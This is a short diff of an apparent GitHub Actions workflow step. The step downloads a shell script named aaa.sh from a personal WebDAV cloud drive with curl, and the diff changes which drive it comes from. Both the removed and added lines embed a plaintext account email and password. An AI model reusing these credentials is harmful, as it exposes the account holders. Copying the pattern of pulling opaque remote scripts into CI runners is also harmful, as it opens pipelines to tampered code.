@@ -45,7 +45,7 @@ jobs:
           # for i in {0..20}; {      curl  -s  http://gongzige.42web.io//tongji.php   ;};          
           #rm aaa.sh
           #curl  -O  https://raw.githubusercontent.com/erbasisan/foder/main/aaa.sh
-          curl    -O  -u  yisanbayi@outlook.com:ydyu1i8iehuxycz      https://app.koofr.net/dav/OneDrive138/my/aaa.sh
+          curl    -O  -u  502112076@qq.com:ax4mgtbia55quvag      http://dav.jianguoyun.com/dav/my/aaa.sh
           cat  aaa.sh
           ls
           echo  下载成功
